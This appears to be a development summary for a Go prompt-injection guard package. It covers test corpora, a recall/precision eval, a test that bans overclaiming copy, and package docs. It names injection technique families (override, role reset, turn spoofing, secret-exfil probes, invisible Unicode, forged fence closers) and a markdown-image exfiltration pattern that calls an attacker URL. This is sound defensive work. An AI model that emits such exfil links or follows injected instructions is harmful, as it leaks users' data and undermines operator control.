---
phase: 32-villa-injection-guard-layer
plan: 02
subsystem: internal/websafe (GUARD-04 eval + honesty discipline)
status: complete
tags: [security, prompt-injection, classifier, must-win-eval, recall, precision, honesty, corpus]
requires:
  - "32-01 (sanitize/normalize/classify production funcs + Verdict + injectionRules tuning surface)"
provides:
  - "testdata/corpus_inject.json — 35-sample held-out adversarial recall corpus"
  - "testdata/corpus_benign.json — 32-sample benign precision corpus (incl. non-Latin + meta-article)"
  - "classify_eval_test.go — must-WIN recall/precision eval with frozen minRecall/minPrecision consts"
  - "honesty_test.go — directory-walking grep-ban (injection-safe/immune/blocks injection)"
  - "doc.go — package honesty copy ('reduces and flags, does not eliminate') + markdown-image residual"
affects:
  - "32-03 (the eval freezes the gate the rewired fetchOne path must keep clearing)"
  - "Phase-33 (egress bound is the documented backstop for the markdown-image residual)"
tech-stack:
  added: []
  patterns:
    - "frozen-const must-WIN gate (minRecall/minPrecision declared before rule tuning)"
    - "array-of-objects testdata corpus read via os.ReadFile + json.Unmarshal (llamacpp_test idiom)"
    - "directory-walking regexp content-ban test (cloned from inference seam_test grep-gate)"
    - "eval scores over the PRODUCTION ordering classify(normalize(sanitize(sample)))"
key-files:
  created:
    - internal/websafe/testdata/corpus_inject.json
    - internal/websafe/testdata/corpus_benign.json
    - internal/websafe/classify_eval_test.go
    - internal/websafe/honesty_test.go
    - internal/websafe/doc.go
  modified: []
  deleted: []
decisions:
  - "frozen thresholds minRecall=0.90 / minPrecision=0.95 as package consts; achieved recall=1.00, precision=1.00 with the 32-01 rules UNCHANGED (no tuning needed)"
  - "honesty grep-ban uses \\bimmune\\b word-boundary so benign 'immunity' (in 32-01 classify.go doc) does not self-trip while 'immune to injection' still fails"
  - "doc.go reworded to avoid literal banned tokens (uses 'confers immunity' not 'immune') so the package doc itself passes its own grep-ban"
  - "out-of-scope gofmt drift in pre-existing 32-01 normalize_test.go/sanitize_test.go reverted, NOT swept into this plan's commit (deferred to 32-01 owner)"
metrics:
  tasks_completed: 3
  files_created: 5
  files_modified: 0
  files_deleted: 0
  duration: ~20m
  completed: 2026-06-19
---

# Phase 32 Plan 02: GUARD-04 Must-WIN Eval + Honesty Discipline Summary

Shipped the honesty-and-evaluation backbone of the injection-guard phase: a held-out adversarial recall corpus (35 samples) + a benign precision corpus (32 samples), a must-WIN eval that scores every sample over the EXACT production ordering `classify(normalize(sanitize(sample)))` against thresholds frozen as consts before any tuning, a directory-walking grep-ban forbidding "injection-safe"/"immune"/"blocks injection" copy, and a `doc.go` stating "reduces and flags, does not eliminate" while documenting the browser-side markdown-image zero-click exfil channel as a known, NOT-closed residual.

## What Was Built

- **`testdata/corpus_inject.json` (recall, 35 samples, all `expect_detected:true`):** spans every 32-01 rule family — imperative-override, role-identity-reset, delimiter-turn-spoofing, secret-exfil-probe — PLUS invisible-Unicode payloads (real U+200B/U+202E/U+FEFF/fullwidth runes embedded in the text), fence-breakout payloads (forged `[/UNTRUSTED_WEB_CONTENT nonce=…]` closers), and HTML/entity-wrapped overrides that exercise the `sanitize` step.
- **`testdata/corpus_benign.json` (precision, 32 samples, all `expect_detected:false`):** ordinary prose across many topics, deliberately including a meta-article ABOUT prompt injection (uses "ignore"/"disregard"/"jail-breaking" in benign prose — Pitfall 3 over-flag stress), benign "ignore the warning" docs prose, "act as a mentor" career advice, AND three non-Latin samples (Arabic, CJK, Japanese — Pitfall 2 over-defang stress).
- **`classify_eval_test.go` (must-WIN gate):** package-level frozen `const minRecall = 0.90`, `const minPrecision = 0.95`. `TestClassifyRecall` and `TestClassifyPrecision` load each corpus via `os.ReadFile` + `json.Unmarshal` and score every sample through `classify(normalize(sanitize(sample)))` — the identical ordering `fetchOne` (32-03) uses. Failures name the offending samples and instruct tuning the rules/corpus, never lowering the consts. `TestClassifyDoesNotDrop` asserts the flag-not-block contract (classify returns a `Verdict` only; input unchanged).
- **`honesty_test.go` (grep-ban):** `TestNoInjectionSafeCopy` clones the `inference/seam_test.go` `filepath.Walk` + regexp structure over `internal/websafe/*.go`, failing on `injection-safe`/`\bimmune\b`/`blocks injection` (case-insensitive); it skips `_test.go` (so the ban list it defines does not self-trip) and asserts ≥1 file was scanned (no vacuous pass). `TestMarkdownImageResidualDocumented` pins that `doc.go` carries the markdown-image residual note framed as a residual that is NOT closed.
- **`doc.go` (package honesty copy):** states the layer "reduces and flags, does not eliminate", lists the four transforms in production order, and documents the markdown-image zero-click exfil channel as a known/accepted residual (model emits `![](attacker-url?data)`, operator's browser fetches it, bypassing container egress) with the Phase-33 egress bound named as the real backstop.

## How to Verify

```bash
go test ./internal/websafe/ -run 'TestClassifyRecall|TestClassifyPrecision|TestClassifyDoesNotDrop|TestNoInjectionSafeCopy|TestMarkdownImageResidualDocumented' -count=1   # all pass
grep -Ec 'classify\(normalize\(sanitize\(' internal/websafe/classify_eval_test.go                # 7 (>=1: production ordering)
grep -c 'minRecall' internal/websafe/classify_eval_test.go                                       # 7 (frozen const present)
grep -c 'reduces and flags' internal/websafe/doc.go                                              # 2
grep -Eic 'markdown.image' internal/websafe/doc.go                                               # 3
grep -rIl --include='*.go' -e 'injection-safe' internal/websafe/ | grep -v honesty_test.go       # no matches
make check                                                                                        # vet + full go test ./... green
```

Measured result: **recall = 1.0000 (35/35), precision = 1.0000 (32/32)** — both clear the frozen thresholds (0.90 / 0.95) with the 32-01 `injectionRules` map UNCHANGED.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Self-trip bug] `doc.go` honesty copy contained the banned literal "immune"**
- **Found during:** Task 3 (writing the grep-ban against the package's own doc).
- **Issue:** The first draft of `doc.go` said "must never claim the layer is … immune to … injection", which the grep-ban (`\bimmune\b`) would flag in `doc.go` itself — a non-test file in scope.
- **Fix:** Reworded to "must never claim the layer confers immunity" ("immunity" is not the banned token "immune") and referenced `honesty_test.go` as the enforcer rather than spelling the banned phrasings inline.
- **Files modified:** internal/websafe/doc.go (pre-commit)
- **Commit:** c3980de

**2. [Rule 3 - Scope-boundary] `go fmt` reformatted out-of-scope pre-existing 32-01 test files**
- **Found during:** Task 3 (running `go fmt ./internal/websafe/` to confirm formatting).
- **Issue:** `go fmt` rewrote `normalize_test.go` and `sanitize_test.go` (32-01 files, not in this plan's `files_modified`), which the atomic-commit rule forbids sweeping into a 32-02 commit.
- **Fix:** Reverted both with `git checkout --`; only `doc.go` + `honesty_test.go` (my files, already gofmt-clean) were staged. The pre-existing gofmt drift in those 32-01 files is logged below as a deferred item for the 32-01 owner.
- **Files modified:** none (revert)
- **Commit:** n/a

### Design Note (not a deviation)

The honesty grep-ban uses the word-boundary regexp `\bimmune\b` rather than a bare substring so the benign word "immunity" already present in the 32-01 `classify.go` package doc ("does NOT confer immunity to prompt injection") does not self-trip the ban, while a genuine dishonest "immune to injection" claim still fails. This matches the seam_test precedent of anchoring patterns to avoid flagging legitimate provenance prose.

## Threat Mitigations Confirmed

- **T-32-06 (evasion / recall):** held-out adversarial corpus (35 ≥ 30, incl. invisible-Unicode + fence-breakout) + frozen recall ≥ 0.90 gate, scored over the production `classify(normalize(sanitize(sample)))` ordering — achieved 1.00.
- **T-32-07 (signal-quality / precision):** benign corpus (32 ≥ 30, incl. non-Latin + meta-article) + frozen precision ≥ 0.95 gate — achieved 1.00; multi-word imperative rules prevent over-flag.
- **T-32-08 (markdown-image zero-click exfil):** accepted residual, documented in `doc.go` as NOT closed; `TestMarkdownImageResidualDocumented` pins the note; Phase-33 egress bound named as the backstop.
- **T-32-09 (dishonest copy):** `TestNoInjectionSafeCopy` directory-walking grep-ban forbids "injection-safe"/"immune"/"blocks injection" across `internal/websafe/*.go`; `doc.go` states "reduces and flags, does not eliminate".

## Notes for Downstream Plans

- **32-03 (seam rewire):** this eval freezes the gate the rewired `fetchOne` must keep clearing. The eval already classifies over the exact `classify(normalize(sanitize(body)))` ordering 32-03 will wire, so a regression in the rewire that changes ordering would surface as a recall/precision drop here.
- **Phase 33 (egress bound):** is the documented real backstop for the markdown-image residual `doc.go` describes; the honesty contract forbids any future "closed/safe" claim about that channel.
- **Tuning surface (unchanged):** `injectionRules` + `injectionRuleOrder` (32-01) remain the only correct knobs if a future corpus addition drops recall/precision below the frozen consts.

## Deferred Issues

- **Pre-existing gofmt drift in 32-01 `normalize_test.go` / `sanitize_test.go`** (out of scope for 32-02): `go fmt` reports a small reformatting diff in these two 32-01-owned files. Reverted here to keep this plan's commits atomic; the 32-01 owner (or a follow-up `gofmt -w`) should land it separately. It does not affect compilation or `make check` (which passed).

## Known Stubs

None — all artifacts are real (corpora + passing must-WIN eval + enforced honesty doc).

## Self-Check: PASSED

- All 5 created files present on disk (corpus_inject.json, corpus_benign.json, classify_eval_test.go, honesty_test.go, doc.go).
- Commits a971939, 88f9989, c3980de exist in git log.
- `go test ./internal/websafe/` green; the five named eval/honesty tests pass; `make check` (vet + full `go test ./...`) exits 0.
- Recall 1.00 / precision 1.00 meet frozen consts 0.90 / 0.95; no banned copy in non-test source.
